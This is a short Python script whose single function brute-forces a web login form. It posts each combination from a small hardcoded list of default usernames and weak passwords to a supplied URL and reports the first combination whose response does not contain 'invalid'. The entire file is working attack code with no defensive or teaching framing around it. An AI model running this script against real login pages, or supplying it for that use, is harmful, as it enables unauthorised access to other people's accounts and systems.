import requests

def brute_login(login_url):
    print("\n[+] Login Bruteforce Started")

    usernames = ["admin", "test"]
    passwords = ["password", "admin123", "test"]

    for u in usernames:
        for p in passwords:
            data = {
                "username": u,
                "password": p
            }
            r = requests.post(login_url, data=data)

            if "invalid" not in r.text.lower():
                print(f"[POSSIBLE LOGIN] {u}:{p}")
                return
            else:
                print(f"[FAILED] {u}:{p}")

    print("[-] No valid credentials found")
